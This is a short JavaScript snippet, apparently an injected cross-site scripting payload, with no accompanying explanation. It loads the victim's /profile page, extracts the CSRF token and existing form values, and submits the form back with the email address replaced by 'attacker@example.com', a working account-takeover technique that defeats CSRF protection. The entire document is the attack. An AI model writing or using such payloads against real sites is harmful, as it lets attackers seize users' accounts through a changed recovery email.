fetch('/profile')
  .then(response => response.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    
    const csrfToken = doc.querySelector('input[name="csrf_token"]').value;

    const params = new URLSearchParams();
    params.append('csrf_token', csrfToken);
    params.append('username', doc.querySelector('input[name="username"]').value);
    params.append('firstname', doc.querySelector('input[name="firstname"]').value);
    params.append('lastname', doc.querySelector('input[name="lastname"]').value);
    params.append('email', 'attacker@example.com');
    
    
    return fetch('/profile', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params.toString()
    });
  })
